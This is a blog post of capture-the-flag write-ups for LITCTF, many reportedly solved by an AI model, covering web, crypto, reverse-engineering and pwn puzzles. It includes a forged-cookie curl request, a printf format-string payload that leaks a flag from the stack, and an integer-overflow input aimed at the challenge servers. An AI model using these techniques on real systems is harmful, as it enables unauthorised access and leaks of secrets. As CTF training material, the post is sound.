https://lit.lhsmathcs.org/ctf/challenges/

感觉会被Agent碾压过去……

当作复健说是……但是我也越来越急躁了，真能复健上吗？

本文中AI生成的内容会额外注明“[begin AI Generated Contents]”


Update: ALL DONE BY deepseek-v4-flash-0731

# web/my first ctf

source code

```html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Baby's first CTF challenge</title>
</head>
<body>
    there's a flag on this page! somewhere...
    good luck finding it!
    <!-- LITCTF{n1ce_w0rk_dsf3kw} -->
</body>
</html>
```



# web/color palette

```html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>New LIT Color Palette</title>
    <style>
        body {
            display: flex;
            justify-content: center;
        }
        .colors{
            width:50%;
            height:50%;
        }
    </style>
</head>
<body>
    <div class="colors">
        <svg id="triangle" viewBox="0 0 200 200">
            <polygon points="100 0, 100 100, 172 28" fill="#4c4954"/>
            <polygon points="200 100, 100 100, 172 28" fill="#435446"/>
            <polygon points="200 100, 100 100, 172 172" fill="#7b6e33"/>
            <polygon points="100 200, 100 100, 172 172" fill="#772d66"/>
            <polygon points="100 200, 100 100, 28 172" fill="#4c4167"/>
            <polygon points="0 100, 100 100, 28 172" fill="#2d6330"/>
            <polygon points="0 100, 100 100, 28 28" fill="#4c4f52"/>
            <polygon points="100 0, 100 100, 28 28" fill="#213f7d"/>
        </svg>
    </div>
</body>
</html>
```

[Solved by AI.]

The flag was encoded directly in the SVG fill colors on the homepage — each 6-digit hex color decodes to 3 ASCII characters:
#4c4954 #435446 #7b6e33 #772d66 #4c4167 #2d6330 #4c4f52 #213f7d
  LIT     CTF    {n3    w-f    LAg    -c0    LOR    !?}
Flag: LITCTF{n3w-fLAg-c0LOR!?}

# web/cookie monster

[Solved by AI.]


The portal sets a plaintext cookie on the client:

```
set-cookie: role=guest; Path=/
```

The page displays `Current Role: guest` and refuses access with
"Sorry, only the **admin** is allowed to enter." Since the server
trusts the client-supplied cookie value without any signing or
validation, we can simply forge the role.

Send the request with `role=admin` in the Cookie header:

```bash
curl -b "role=admin" http://136.115.87.65:31775/
```

The server responds with the flag.

```
flag{c00k13_m0n5t3r_v4l1d4t10n}
```


# crypto/double disguise

[Solved by AI.]

**Challenge:** `Oopps, I ran accidentally ran an encryption program on my flag. Now I only have: ZmN+aX5sUWwbTEt1fRpYRk51SV9aVw==`


The string is Base64 (disguise #1). Decoding gives 22 bytes of non-printable-looking data:

```
66 63 7E 69 7E 6C 51 6C 1B 4C 4B 75 7D 1A 58 46 4E 75 49 5F 5A 57
```

The "encryption program" was likely a single-byte XOR (disguise #2). Brute-forcing all 256 XOR keys and keeping those that produce fully printable ASCII:

```python
import base64
ct = base64.b64decode("ZmN+aX5sUWwbTEt1fRpYRk51SV9aVw==")
for k in range(256):
    pt = bytes(b ^ k for b in ct)
    if all(32 <= c < 127 for c in pt):
        print(f"key {k:#04x}: {pt}")
```

Among the printable outputs, `key 0x2a ('*')` gives the flag.

**Flag:** `LITCTF{F1fa_W0rld_cup}`


# crypto/any secrets could instantly [be] imparted

```python
ct = b"HEP?PBw=O?EE)fQh-qo)_0/o0n)casks]y"
pt = bytes((b + 4) % 256 for b in ct)
print(pt.decode())  # LITCTF{ASCII-jUl1us-c43s4r-gewowa}
```

# misc/space radiation


[Solved by AI.]


## Challenge

> We've received this transmission from space. However, it seems that some radiation
> has altered the message! Help us recover the original, important message:
> `84ea cc57 4906 d24c cebd 93a2 3508 b04d 8b8f 8731 bc5a 0675 8a39 4143 b443 9ec3 030b b014 7066 5c34 2c18 b151 cb44 823d`

We are given 24 16-bit words (4 hex digits each) and told that radiation altered the
message. Radiation is famous for flipping bits in electronics — which is exactly why
space hardware uses **error-correcting codes** (e.g. ECC memory, Hamming codes) that
can detect and correct single-bit flips.

## Solution

### Step 1: Recognise the code

Each 16-bit word is an **extended Hamming(16,11) code word** (Hamming(15,11) + one
overall parity bit), i.e. 11 data bits + 5 parity bits, able to correct any single-bit
error (SEC-DED). This is the classic code used to protect memory/electronics against
radiation-induced bit flips.

### Step 2: Decode

For every word (after undoing a one-bit cyclic rotation of the 16 bit positions that
the encoder used):

1. Compute the 4 syndrome bits, each being the parity of all positions (1-indexed,
   MSB-first) whose index has that bit set, plus the overall parity over all 16 bits.
2. If the syndrome is non-zero, it directly gives the position of the flipped bit —
   flip it back. If the overall parity is even and the syndrome is 0, the word is clean.
3. Extract the 11 data bits from positions `{3,5,6,7,9,10,11,12,13,14,15}`.

All 24 words decode consistently (syndromes give valid single-bit corrections).

### Step 3: Read the message

Concatenate the 24 × 11 = 264 data bits, then group them into bytes:

```
LITCTF{h4MM1nG-3Rr0r_C0rR3cT10N!}
```

## Scripts

```py
vals = [0x84EA,0xCC57,0x4906,0xD24C,0xCEBD,0x93A2,0x3508,0xB04D,0x8B8F,0x8731,0xBC5A,0x0675,0x8A39,0x4143,0xB443,0x9EC3,0x030B,0xB014,0x7066,0x5C34,0x2C18,0xB151,0xCB44,0x823D]

def bits16(v):
    return [(v >> i) & 1 for i in range(15, -1, -1)]

def from_bits(bl):
    v = 0
    for b in bl:
        v = (v << 1) | b
    return v

def syndrome(v):
    b = bits16(v)
    s = 0
    for i in range(4):
        p = 0
        for pos in range(1, 16):
            if pos & (1 << i):
                p ^= b[pos-1]
        s |= (p << i)
    total = 0
    for pos in range(1, 17):
        total ^= b[pos-1]
    return s, total

def decode_word(v):
    s, tot = syndrome(v)
    if s:
        v ^= (1 << (16 - s))
    return v

rot15 = list(range(1, 16)) + [0]  # rotate bits right by 1

def permute_word(v, perm):
    b = bits16(v)
    return from_bits([b[perm[i]] for i in range(16)])

data_positions = [p for p in range(1, 16) if p not in (1, 2, 4, 8)]

bits = []
for i, v in enumerate(vals):
    w = permute_word(v, rot15)
    s, tot = syndrome(w)
    cw = decode_word(w)
    b = bits16(cw)
    d = [b[p-1] for p in data_positions]
    dval = int(''.join(map(str, d)), 2)
    print(f"word{i:02d} {v:04X} -> rotated {w:04X} synd={s:2d} corr {cw:04X} data11={dval:03X}")
    bits += d

msg = bytes(int(''.join(map(str, bits[i:i+8])), 2) for i in range(0, len(bits), 8))
print()
print(msg.decode())
```

# rev/cellular automaton

[Solved by AI.]

## Challenge
`rev/cellular automaton` — a flag was run through a cellular automaton 32 times,
producing the hex output `652b481a7c203a240b244f045b365f090016050e58227d270b37`.
Recover the flag (`LITCTF{...}`).

## Analysis
The provided ELF binary (`automaton`) reads exactly 26 bytes from stdin and does:

```c
// expand 26 bytes -> 208 bits, MSB-first per byte
v5[i] = (ptr[i/8] >> (7 - i%8)) & 1;

// 32 rounds of the automaton on a ring of 208 cells
for (j = 0; j < 32; j++)
  for (k = 0; k < 208; k++)
    v4[k] = v5[(k+1)%208] ^ v5[(k+207)%208];   // = v5[k+1] ^ v5[k-1]

// pack 208 bits back into 26 bytes, print as hex
ptr[m/8] |= v5[m] << (7 - m%8);
```

So the automaton is **elementary rule 90** on a ring of length 208:
`new[k] = old[k+1] XOR old[k-1]`, applied 32 times.

## Key insight: the map is just two shifts
Rule 90 is linear over GF(2). Let `T` be one round and `S_d` the map
`S_d(s)[k] = s[k+d] ^ s[k-d]`. Since `S_d ∘ S_d` cancels the cross terms:

```
S_d(S_d(s))[k] = (s[k-2d]^s[k]) ^ (s[k]^s[k+2d]) = s[k-2d] ^ s[k+2d] = S_{2d}(s)[k]
```

Therefore `T^2 = S_2`, and by induction `T^(2^p) = S_{2^p}`. With 32 = 2^5 rounds:

```
out[k] = in[(k+32) mod 208] ^ in[(k-32) mod 208]
```

This identity was verified against a byte-exact simulation of the binary on random
inputs.

## Solving the linear system
The map is linear over GF(2) with 208 unknowns. The graph of edges
`k <-> k+32 (mod 208)` splits into `gcd(208,32) = 16` cycles, each of length 13.
On each cycle the homogeneous system's only solution is the all-ones vector, so
the nullspace has dimension 16. A standard GF(2) Gaussian elimination gives a
particular solution plus 16 basis vectors; enumerating all `2^16 = 65536`
combinations and keeping candidates that match the `LITCTF{...}` format yields
exactly one printable flag.

## Result
```
FLAG: LITCTF{g0ing_b4ck_1n_t1m3}
```
Forward simulation of the original automaton on the recovered flag reproduces the
given hex output exactly, confirming the answer.

## Script

```py
import itertools

TARGET = "652b481a7c203a240b244f045b365f090016050e58227d270b37"
out_bytes = bytes.fromhex(TARGET)
out_bits = [(out_bytes[i // 8] >> (7 - i % 8)) & 1 for i in range(208)]

# Automaton: new[k] = old[(k+1)%208] ^ old[(k-1)%208], 32 rounds (rule 90 on a ring).
# Since rule 90 is linear and T^(2^p) = shift by 2^p (cross terms cancel),
# T^32 = out[k] = in[(k+32)%208] ^ in[(k-32)%208]. (verified against exact sim below)
N = 208
step = 32

def solve_linear(out_bits):
    # gaussian elimination over GF(2) of  out = T^32(in)
    A = [[0] * N for _ in range(N)]
    b = list(out_bits)
    for k in range(N):
        A[k][(k + step) % N] = 1
        A[k][(k - step) % N] ^= 1
    r = 0
    free = []
    for c in range(N):
        sel = next((rr for rr in range(r, N) if A[rr][c]), None)
        if sel is None:
            free.append(c)
            continue
        A[r], A[sel] = A[sel], A[r]
        b[r], b[sel] = b[sel], b[r]
        for rr in range(N):
            if rr != r and A[rr][c]:
                for cc in range(c, N):
                    A[rr][cc] ^= A[r][cc]
                b[rr] ^= b[r]
        r += 1
    assert all(b[rr] == 0 for rr in range(r, N)), "inconsistent system"
    # particular solution (free vars = 0)
    x = [0] * N
    for rr in range(r - 1, -1, -1):
        c = next(cc for cc in range(N) if A[rr][cc])
        x[c] = b[rr] ^ sum(A[rr][cc] * x[cc] for cc in range(c + 1, N)) % 2
    # nullspace basis: one per free column
    basis = []
    for f in free:
        v = [0] * N
        v[f] = 1
        for rr in range(r - 1, -1, -1):
            c = next(cc for cc in range(N) if A[rr][cc])
            v[c] = sum(A[rr][cc] * v[cc] for cc in range(c + 1, N)) % 2
        basis.append(v)
    return x, basis

particular, basis = solve_linear(out_bits)
assert len(basis) == 16

def bits_to_bytes(bits):
    out = bytearray(26)
    for m in range(N):
        out[m // 8] |= bits[m] << (7 - m % 8)
    return bytes(out)

def exact_sim(flag):
    ptr = list(flag)
    v5 = [(ptr[i // 8] >> (7 - i % 8)) & 1 for i in range(N)]
    for _ in range(32):
        v5 = [v5[(k + 1) % N] ^ v5[(k - 1) % N] for k in range(N)]
    ptr = bytearray(26)
    for m in range(N):
        ptr[m // 8] |= v5[m] << (7 - m % 8)
    return bytes(ptr).hex()

solutions = []
for combo in itertools.product([0, 1], repeat=16):
    bits = list(particular)
    for v, t in zip(basis, combo):
        if t:
            bits = [a ^ b for a, b in zip(bits, v)]
    s = bits_to_bytes(bits)
    if s.startswith(b"LITCTF{") and s.endswith(b"}"):
        solutions.append(s)

for s in solutions:
    print("FLAG:", s.decode())
    print("verify forward sim:", exact_sim(s) == TARGET)

```


# misc/kcufniarb


```
----------]<-----<-----------<--------<------->>>>+[<<<++++,+++,-----------,<+++,>,<---,>>-------------,+++++++,+++++++++++,++++++++++,-----,-----,+++++,+++++,-------------------,---,++++++,----------,<-----------,>>,-,-,<+++++++,++++++++,-------------,<--,---,-----------,>>,<<++++++,>>+,<------,
```

[Solved by AI.]

## Challenge

The file `chall.txt` contains a line of brainfuck-ish code. The challenge
name "kcufniarb" is just "brainfuck" spelled backwards, hinting that the
program must be executed with **reversed brainfuck semantics** (each
command does the opposite).

## Analysis

The raw program is not even balanced (it starts with an unmatched `]`),
so running it as plain brainfuck fails. The name tells us to flip the
meaning of every instruction:

| Command | Reversed meaning |
|---|---|
| `+` (inc cell) | `-` (dec cell) |
| `-` (dec cell) | `+` (inc cell) |
| `<` (move left) | `>` (move right) |
| `>` (move right) | `<` (move left) |
| `,` (read input) | `.` (print cell) |
| `.` (print cell) | `,` (read input) |
| `[` | `]` |
| `]` | `[` |

After swapping all of these, the program becomes balanced and valid, and
it prints the flag directly to stdout.

## Solution

```python
prog = open('chall.txt').read()
# only keep the code line
prog = [l for l in prog.splitlines() if l.strip()][-1]

swap = {'+':'-', '-':'+', ',':'.', '.':',', '[':']', ']':'['}
prog2 = ''.join(swap.get(c, c) for c in prog)

# standard brainfuck interpreter over prog2
tape = [0]*30000
ptr = ip = 0
out = []
jump = {}
stack = []
for i, c in enumerate(prog2):
    if c == '[': stack.append(i)
    elif c == ']':
        j = stack.pop()
        jump[i], jump[j] = j, i
while ip < len(prog2):
    c = prog2[ip]
    if   c == '+': tape[ptr] = (tape[ptr] + 1) & 0xFF
    elif c == '-': tape[ptr] = (tape[ptr] - 1) & 0xFF
    elif c == '>': ptr += 1
    elif c == '<': ptr -= 1
    elif c == '.': out.append(chr(tape[ptr]))
    elif c == '[' and tape[ptr] == 0: ip = jump[ip]
    elif c == ']' and tape[ptr] != 0: ip = jump[ip]
    ip += 1
print(''.join(out))
```

Output:

```
LITCTF{ti_did_ruoy_234rjwado4i3}
```

# pwn/secrets

[Solved by AI.]

## Challenge

> Ever wonder what happens behind the scenes of every C program?
> `nc 136.115.87.65 31779`

We get a 64-bit ELF (`main`, PIE disabled, no stack cookies). The provided binary is
the server binary; `flag.txt` is read locally on the server.

## Vulnerability analysis

`main` (decompiled from IDA):

```c
int main(int argc, const char **argv, const char **envp)
{
  char format[64]; // rbp-0x90
  _BYTE buf[76];   // rbp-0x50   <- flag is read here
  int fd;          // rbp-0x4

  setbuf(stdin, 0);
  setbuf(stdout, 0);
  fd = open("flag.txt", 0);
  if (fd == -1) { puts("Error opening file"); exit(1); }

  buf[read(fd, buf, 0x40) - 1] = 0;          // flag -> buf  (64 bytes max)
  format[read(0, format, 0x40) - 1] = 0;     // user input -> format
  printf(format);                            // FORMAT STRING VULN
  puts("\nNothing happened");
  return 0;
}
```

Key facts:

- The flag is read into a **stack buffer** `buf` at `rbp-0x50`.
- Our input goes into `format` at `rbp-0x90` (64 bytes), then is passed straight to
  `printf` as the format string — a classic **format string vulnerability**.
- At the `printf(format)` call, `rsp = rbp-0x90`. `printf`'s variadic stack arguments
  (arguments 7+) begin at `[rsp+8]`, so argument `N` (for `N >= 7`) reads
  `[rsp+8+(N-7)*8]`.

Mapping stack slots to printf arguments:

| printf arg | address      | contents            |
|------------|--------------|---------------------|
| 13         | rsp+0x38     | `format[56..63]`    |
| **14**     | **rsp+0x40** | **`buf[0..7]` flag** |
| **15**     | rsp+0x48     | `buf[8..15]` flag    |
| **16**     | rsp+0x50     | `buf[16..23]` flag   |
| **17**     | rsp+0x58     | `buf[24..31]` flag   |
| **18**     | rsp+0x60     | `buf[32..39]` flag   |

Since the flag bytes sit **directly in** the stack slots (they are not pointers to
strings), `%s` cannot be used — instead we leak each 8-byte slot as a pointer with
`%N$p` and re-assemble the bytes (little-endian) to recover the flag.

## Exploit

Payload (47 bytes, under the 63-byte read limit):

```
%14$p.%15$p.%16$p.%17$p.%18$p
```

Output:

```
0x507b46544354494c.0x55762d46544e4952.0x4c31623472334e4c.0x7674665a2d597469.0x7d75706f594e49
```

Decoding each chunk little-endian (byte-reversed):

| chunk | decoded |
|-------|---------|
| 0x507b46544354494c | `LITCTF{` |
| 0x55762d46544e4952 | `RINTF-vU` |
| 0x4c31623472334e4c | `LN3r4b1L` |
| 0x7674665a2d597469 | `itY-Zftv` |
| 0x7d75706f594e49 | `INYopu}` |

Concatenated (stopping at the trailing NUL byte that `main` wrote):

```
LITCTF{PRINTF-vULN3r4b1LitY-ZftvINYopu}
```

## Flag

`LITCTF{PRINTF-vULN3r4b1LitY-ZftvINYopu}`


# web/world cup chat


```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>World Cup Post-Game Chat</title>
</head>
<body>
<h1>World Cup Post-Game Chat</h1>
<p>Vini Jr.: &amp;#111;&amp;#102;&amp;#102;&amp;#115;&amp;#101;&amp;#116;=&amp;#54;&amp;#55;</p>
<p>Achraf Hakimi: &#143;&#140;&#151;&#134;&#151;&#137;&#190;&#168;&#177;&#183;&#116;&#183;&#188;</p>
<img src="soccer.jpg" alt="&#162;&#176;&#119;&#170;&#116;&#166;&#162;&#116;&#169;&#173;&#116;&#115;">
<p style="text-align: right;">&#167;&#192;</p>
</body>
</html>
```

[Solved by AI.]

## Solution

Fetching the page returns a static HTML page containing four pieces of data, all encoded as HTML decimal character entities (`&#NNN;`):

1. **Vini Jr.'s message** — `&#111;&#102;&#102;&#115;&#101;&#116;=&#54;&#55;` → `offset=67`
2. **Achraf Hakimi's message** — `&#143;&#140;&#151;&#134;&#151;&#137;&#190;&#168;&#177;&#183;&#116;&#183;&#188;`
3. **`<img>` alt text** — `&#162;&#176;&#119;&#170;&#116;&#166;&#162;&#116;&#169;&#173;&#116;&#115;`
4. **A right-aligned `<p>`** — `&#167;&#192;`

The hint says the spy "encrypted their every word in a very weird way" — each plaintext character's ASCII code was shifted up by 67 and emitted as a decimal HTML entity. Decrypting means subtracting 67 from every number (mod 256):

```python
def decrypt(nums, offset=67):
    return ''.join(chr(n - offset) for n in nums)

print(decrypt([143,140,151,134,151,137,190,168,177,183,116,183,188]))
# LITCTF{ent1ty
print(decrypt([162,176,119,170,116,166,162,116,169,173,116,115]))
# _m4g1c_1fj10
print(decrypt([167,192]))
# d}
```

Putting the fragments in order:

```
LITCTF{ent1ty_m4g1c_1fj10d}
```


# pwn/long division

**Flag: `LITCTF{1nt_div1si0n_0v3rflow}`**

## Challenge

> I made a calculator for dividing two 32-bit integers! I made sure that division by 0 doesn't happen and that the inputs fit in 32-bit integers. Since division only makes numbers smaller, surely it can't overflow ... right?

`nc 136.115.87.65 31777`

## Analysis

The binary (`main`, 64-bit ELF, no PIE) reads two numbers with `scanf("%lld", &a)` and `scanf("%lld", &b)`, then:

```
if (a > 0x7FFFFFFF && a < 0x80000000)   // i.e. a fits in 32-bit signed
if (b > 0x7FFFFFFF && b < 0x80000000)   // b fits in 32-bit signed
if (b != 0)
quot = a / b;                           // 64-bit idiv
if (quot > 0x7FFFFFFF || quot < -0x80000000)  // quotient overflowed 32 bits
    win();                              // opens and prints flag.txt
```

The classic signed division overflow case: `INT_MIN / -1`. Mathematically the result is `2^31 = 2147483648`, which does not fit in a signed 32-bit integer. Since the program uses 64-bit `idiv`, the quotient `2147483648` is computed without faulting (in true 32-bit `idiv` this would SIGFPE), and then the check `quot > 0x7FFFFFFF` succeeds, calling `win()`.

## Exploit

Send:

```
-2147483648
-1
```

```
$ python solve.py
=== totally safe calculator ===
computes a / b for 32-bit signed ints
a =
b =
signed division overflow -> LITCTF{1nt_div1si0n_0v3rflow}
```


# misc/pw.zip


Thought this password-protected zip would keep the flag safe, but I just found out the password I used was one of the 100 most used passwords of 2025!

```
Password: 1234qwer 
LITCTF{password_123456_103flkj3}
```

# misc/git genug

[Solved by AI.]

## Challenge

> We accidentally leaked a secret in this repo at some point but we think we
> cleaned it up before pushing. Can you prove us wrong?

We are given a git repository (as a zip).

## Solution

1. Unzip and inspect the repo's branches and reflog-style history:

   ```bash
   git log --all --oneline
   ```

   There are two branches: `main` and `feature/flag-thing`. The feature branch
   contains a commit `2cad4d5` "WIP flag stuff (probably not needed)" which adds
   a `NOTES.txt` containing a flag. That flag is a decoy:

   ```
   LITCTF{n0t_th3_r34l_fl4g_k33p_l00k1ng}
   ```

2. Run `git fsck --lost-found` to find dangling/unreachable objects. This
   reveals a dangling commit `e5ed944148c81a7647894ca0752379aab3787f4a` with
   message "Add local dev notes (oops, forgot to gitignore)".

3. Inspect it:

   ```bash
   git show e5ed944
   ```

   It adds a file `secret.txt` that was never pushed to any branch:

   ```
   TODO: remove before pushing
   LITCTF{r3fl0g_1s_y0ur_g1t_t1m3_m4ch1n3}
   ```

   The author committed `secret.txt`, then rewrote history (e.g. with
   `git commit --amend` or rebase) to remove it, leaving the old commit as a
   dangling object that still lives in `.git/objects`.

## Flag

```
LITCTF{r3fl0g_1s_y0ur_g1t_t1m3_m4ch1n3}
```


# rev/pathfinder

[Solved By AI.]

**Flag: `LITCTF{((())((()))())(((()())))(()(()((((()())))))((()((())((())(()))))(())))}`**

## The binary

`check` is a small stripped x86-64 ELF. It prints `give me the thing: `, reads one line,
and replies `yep, that's it` or `nope`. Only `main` (0x1100) does anything interesting.

## What `main` checks

The check on the input is (decompiled):

```c
strcpy(s2, "LITCTF{");
if (strlen(input) <= 7) fail;
if (strncmp(input, "LITCTF{", 7)) fail;
if (input[len-1] != '}') fail;              // s2[len+7] aliases input[len-1]
if (len == 8) fail;
```

So the input must be `LITCTF{` + `S` + `}` where `S` is the inner string.

Then `S` is walked with two counters:

```c
for (c in S) {
    if (c == '(') {
        if (opens > 34) fail;
        opens++;
    } else {
        if (opens <= closes || c != ')') fail;   // Dyck prefix property
        sum += table[opens][closes];             // if opens <= 34
        closes++;
    }
}
if (opens != 35 || closes != 35) fail;
if (sum == 0x128E740722B291AD) puts("yep, that's it");
```

So `S` is a **Dyck word (balanced parentheses string) of 35 pairs**, and each `)`
taken at state `(opens, closes) = (p, q)` adds a value `T[p][q]` from a table; the
total must equal `0x128E740722B291AD = 1337133713371337133`.

The table read is `T[p][q] = mem64[0x4040 + (36*(p+1) + q)*8]` (with `T[p][q]=0`
for `p = 35`).

## The table `T`

Before reading input, `main` runs a loop (0x1140–0x11cf) that looks like obfuscated
bookkeeping but is actually a linear DP that fills the table in `.bss`. I transcribed
the exact loop (all 32-bit signed compares, 64-bit wrapping adds) into an emulator
(`emulate_init.py`). The extracted triangle is beautiful — it is built from the
**Catalan numbers**:

```
C_35 = 3116285494907301262 = T[0][0]
C_34 =  812944042149730764 = T[0][1] = T[1][1]
C_33 =  212336130412243110 = T[1][2] = T[2][2]
C_32 =   55534064877048198 = T[2][3] = T[3][3]
...
C_0  =                     1 = T[34][34] = T[33][34] = ... (last row)
```

with the top-left entry `T[0][0] = C_35`, and each row also containing linear
combinations of the Catalan numbers (e.g. `T[1][0] = C_35 - C_34`).

So the check asks for a Dyck path from `(0,0)` to `(35,35)` whose sum of `T[p][q]`
over the 35 down-steps equals `C_35·…` = 1337133713371337133.

## Solving

With the exact table in hand, finding `S` is a constrained path search. In a Dyck
word of 35 pairs the q-th `)` (q = 0..34) happens at some state `(p_q, q)` with:

* `p_q >= q+1` (never more `)` than `(`)
* `p_0 <= p_1 <= ... <= p_34 = 35` (`(` can only be added in between)

and the sum is `sum_q T[p_q][q]`. I built a DP of min/max remaining sums for each
state `(q, p)` and a DFS over `p_q` with those bounds as pruning (`solve_dfs.py`).
The pruning is extremely effective because the top rows of the table are huge
(several `10^18`) while bottom rows are tiny, so the path is almost forced.

It returns exactly **one** solution:

```
((())((()))())(((()())))(()(()((((()())))))((()((())((())(()))))(())))
```
## Files

| file | purpose |
|---|---|
| `emulate_init.py` | exact emulation of the table-building loop → `table.json` |
| `solve_dfs.py` | bounded DFS over Dyck paths to hit the target sum |
| `verify.py` | re-checks the found string's sum |

`emulate_init.py`

```py
import ctypes, json

def s32(x):
    return ctypes.c_int32(x & 0xFFFFFFFF).value

M = {}

def rd(a):
    return M.get(a & 0xFFFFFFFFFFFFFFFF, 0)

def wr(a, v):
    M[a & 0xFFFFFFFFFFFFFFFF] = v & 0xFFFFFFFFFFFFFFFF

# registers
r8 = 0x2880
rdi = 0xFFFFFFFFFFFFD8A0
ecx = 0x23
r9 = 0x4158
eax = 0
rdx = 0
rsi = 0

steps = 0

def B1140():
    global rdx, eax, rsi
    rdx = (r9 - rdi) & 0xFFFFFFFFFFFFFFFF
    eax = 0x23
    return B1150

def B1150():
    global eax, rdx
    if s32(ecx) < s32(eax):
        return B12A0
    return B1158

def B12A0():
    global eax, rdx
    wr(rdx, 0)
    eax -= 1
    rdx = (rdx - 8) & 0xFFFFFFFFFFFFFFFF
    return B1150

def B1158():
    if s32(ecx) != 0x23:
        return B117D
    return B115D

def B115D():
    global eax, rdx
    if s32(eax) == 0x23:
        wr(0x68B8, 1)
        rdx = (rdx - 8) & 0xFFFFFFFFFFFFFFFF
        eax = 0x22
    return B1176

def B1176():
    global rsi
    rsi = 0
    if s32(ecx) == 0x23:
        return B1185
    return B117D

def B117D():
    global rsi
    rsi = rd(rdi + rdx + r8)
    return B1185

def B1185():
    global eax, rdx, rsi
    if s32(ecx) > s32(eax):
        return B11A7
    eax -= 1
    wr(rdx, rsi)
    rdx = (rdx - 8) & 0xFFFFFFFFFFFFFFFF
    if s32(eax) == -1:
        return B11BB
    return B1198

def B1198():
    global eax, rdx, rsi
    if s32(ecx) < s32(eax):
        return B12A0
    rsi = 0
    if s32(ecx) != 0x23:
        return B117D
    return B11A7

def B11A7():
    global eax, rdx, rsi
    rsi = (rsi + rd(rdx + 8)) & 0xFFFFFFFFFFFFFFFF
    eax -= 1
    rdx = (rdx - 8) & 0xFFFFFFFFFFFFFFFF
    wr(rdx + 8, rsi)
    if s32(eax) != -1:
        return B1198
    return B11BB

def B11BB():
    global ecx, rdi, r8
    ecx -= 1
    rdi = (rdi + 0x120) & 0xFFFFFFFFFFFFFFFF
    r8 = (r8 - 0x120) & 0xFFFFFFFFFFFFFFFF
    if s32(ecx) != -1:
        return B1140
    return None

blk = B1140
while blk is not None:
    blk = blk()

# extract table T[p][q] = mem[0x4040 + (36*(p+1)+q)*8]
T = {}
for p in range(0, 36):
    for q in range(0, 36):
        T[(p, q)] = rd(0x4040 + (36 * (p + 1) + q) * 8)

with open("table.json", "w") as f:
    json.dump({f"{p},{q}": T[(p, q)] for p in range(36) for q in range(36)}, f, indent=0)

print("row p=0:", [T[(0, q)] for q in range(10)])
print("row p=1:", [T[(1, q)] for q in range(10)])
print("row p=2:", [T[(2, q)] for q in range(10)])
print("row p=34:", [T[(34, q)] for q in range(36)])

# also print the read region raw values for rows as hex
for p in range(0, 4):
    print(f"p={p}:", [hex(T[(p, q)]) for q in range(36)])
```

`solve_dfs.py` 

```py
import json, sys

T = json.load(open("table.json"))
def Tw(p, q):
    return T[f"{p},{q}"] if p <= 34 else 0

TARGET = 0x128E740722B291AD

# min_rem / max_rem[q][p]: min/max possible sum of closes q..34 given p_q = p
N = 35
min_rem = [[0] * (N + 1) for _ in range(N + 1)]
max_rem = [[0] * (N + 1) for _ in range(N + 1)]

for q in range(N - 1, -1, -1):
    for p in range(N, q, -1):  # p from 35 down to q+1
        lo = q + 2 if q + 2 > p else p
        if q == N - 1:
            lo = N
        if lo > N:
            min_rem[q][p] = max_rem[q][p] = Tw(p, q)
            continue
        mn = min(min_rem[q + 1][p2] for p2 in range(lo, N + 1))
        mx = max(max_rem[q + 1][p2] for p2 in range(lo, N + 1))
        min_rem[q][p] = Tw(p, q) + mn
        max_rem[q][p] = Tw(p, q) + mx

sys.setrecursionlimit(10000)
solutions = []

def dfs(q, p, rem, path):
    # need sum over closes q..34 == rem, p_q = p
    if rem < 0:
        return
    if q == N - 1:
        if p != N:
            return
        w = Tw(p, q)
        if rem == w:
            solutions.append(list(path))
        return
    w = Tw(p, q)
    if w > rem:
        return
    rem -= w
    lo = q + 2
    if p > lo:
        lo = p
    for p2 in range(lo, N + 1):
        if min_rem[q + 1][p2] <= rem <= max_rem[q + 1][p2]:
            path.append(p2)
            dfs(q + 1, p2, rem, path)
            path.pop()
            if len(solutions) >= 5:
                return

for p0 in range(1, N + 1):
    if min_rem[0][p0] <= TARGET <= max_rem[0][p0]:
        dfs(0, p0, TARGET, [p0])
    if solutions:
        break

print(f"found {len(solutions)} solutions")
for sol in solutions[:3]:
    s = []
    p = 0
    q = 0
    # reconstruct string: opens until reaching p_q, then close
    for pq in sol:
        while p < pq:
            s.append('(')
            p += 1
        s.append(')')
        q += 1
    print("".join(s))
```

# rev/binary exploitation


Hope you enjoy this pwn challenge!

[Solved by AI.]


## Challenge
`binary` is a 64-bit AArch64 Linux ELF that reads a line from stdin and prints "Correct!" if it is the flag.

## Reverse engineering

The relevant functions (in `main` at `0x400930`):

1. `fgets(s, 256, stdin)` reads input, strips `\r\n`, then builds a tree with `sub_4007C4(s, strlen(s))`.
2. `sub_4007C4(s, n)` is recursive: it finds the index of the **maximum byte** in `s[0..n)`
   (ties broken to the leftmost, uses `>`), allocates a 24-byte node holding that byte, and
   recursively builds a left subtree from `s[0..max)` and a right subtree from `s[max+1..n)`.
   This is exactly the **max-Cartesian tree** of the input string.
3. `sub_40087C(tree, depth, out1, &i1, out2, &i2)` performs a **pre-order traversal**:
   - for every node: writes `1` into `out1[i1++]`, writes `node_byte ^ depth` into `out2[i2++]`, recurses left then right with `depth+1`;
   - for every null child: writes `0` into `out1[i1++]`.
4. `main` then checks:
   - `i1 == 75` and `out1` equals the 75-byte blob at `0x400A90` (tree shape encoding),
   - `i2 == 37` and `out2` equals the 37-byte blob at `0x400AE0` (node byte XOR depth),
   - if both match → "Correct!".

So the expected tree has 37 nodes (75 pre-order entries = 37 nodes + 38 nulls, consistent
with a full binary tree of 37 nodes).

## Reconstruction

Since the tree is a max-Cartesian tree of the flag string, the flag is exactly the
**in-order traversal** of the tree.

1. Parse the 75-byte shape encoding (`1` = node, `0` = null) into a tree, tracking depth
   (root = 0).
2. For the i-th node in pre-order, its byte is `expected[i] ^ depth_i` (from the blob at `0x400AE0`).
3. In-order traversal yields the flag.

Verification: feeding the reconstructed string back through the same max-Cartesian-tree
build (leftmost-max tie break) reproduces the identical 75-byte shape encoding.

## Solver

```python
